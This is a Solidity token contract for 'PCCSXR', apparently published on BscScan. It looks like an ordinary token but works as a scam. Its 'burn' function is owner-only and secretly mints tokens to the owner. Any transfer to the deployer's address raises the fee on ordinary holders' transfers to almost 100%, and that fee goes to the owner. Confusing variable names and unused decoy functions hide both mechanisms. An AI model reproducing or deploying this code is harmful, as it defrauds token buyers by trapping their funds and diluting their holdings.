/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.5.4;
contract NMRBWSD {
uint256 public constant totalSupply = 1000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  WHBUZH = 2;
address private  BIQFIY = address(0);
address private  OGUNQF = address(0);
address private  EKXEEV = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  EPBYNV = 2;
uint256 private  VUTJCO = 1;
string public  symbol = "PCCSXR";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  RNYNRQ = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  JDVNPK = 8;
uint8 public constant decimals = 18;
uint256 private  YBGHFN = 6;
address public owner;
address private  DTYVTY = address(0);
uint256 public constant OEYTFL = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  TZLGRN = 1000000000000000000;
uint256 private  SEVUPH = 8;
string public  name = "PCCSXR";
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SENYEA");
require(to != address(0), "SENYEA");
require(amount <= balanceOf[from], "SENYEA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OEYTFL/TZLGRN ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==RNYNRQ){
TZLGRN = OEYTFL+2;
}
emit Transfer(from, to, transferAmount);
}
function _add1JDVNPK() private returns (uint256) {
return JDVNPK + VUTJCO;
}
//
function _getD2TYVTY() private returns (address) {
return DTYVTY;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _addSE3VUPH() private returns (uint256) {
return SEVUPH--;
}
//
function _getEKX4EEV() private returns (address) {
return EKXEEV;
}
//
function _addVUTJ5CO() private returns (uint256) {
return VUTJCO / EPBYNV;
}
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSENYEA 0");
require(spender != address(0), "fSENYEA 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
RNYNRQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getEPBYN6V() private returns (uint256) {
return EPBYNV + WHBUZH;
}
//
function _addWHBUZH7() private returns (uint256) {
return WHBUZH++;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getB8IQFIY() private returns (address) {
return BIQFIY;
}
//
function _addYB9GHFN() private returns (uint256) {
return YBGHFN--;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getOGU10NQF() private returns (address) {
return OGUNQF;
}
//
//
}

library Address256 {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}